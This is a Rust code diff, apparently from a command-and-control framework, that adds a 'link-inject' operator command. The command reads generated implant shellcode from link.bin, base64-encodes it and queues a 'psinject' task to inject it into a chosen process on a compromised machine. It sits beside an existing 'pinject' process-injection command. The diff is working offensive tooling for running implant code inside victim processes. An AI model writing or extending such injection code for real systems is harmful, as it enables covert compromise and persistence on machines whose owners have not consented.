@@ -5,6 +5,31 @@ use server::links::Links;
 use crate::server;
 use crate::util;
 
+pub fn link_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
+    if command.len() < 2 {
+        println!("link-inject <pid> \n   eg: link-inject 1307");
+        return;
+    }
+    if std::fs::metadata("./link.bin").is_err() {
+        println!("generate links first");
+        println!("there must be link.bin in the current directory");
+        return;
+    }
+    let shellcode = match std::fs::read("link.bin") {
+        Err(e) => {
+            println!("{}", e);
+            return;
+        }
+        Ok(shellcode) => shellcode,
+    };
+    let shellcode_b64 = base64::encode(shellcode);
+    let mut updated_command = command.clone();
+    updated_command[0] = "psinject".to_string();
+    updated_command.push(shellcode_b64);
+    links.links.lock().unwrap()[link_index]
+        .set_command(updated_command.join(" "), command.join(" "));
+}
+
 pub fn process_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
     if command.len() < 3 {
         println!("pinject <pid> <path-to-shellcode>\n   eg: pinject 1307 /tmp/shellcode.bin");
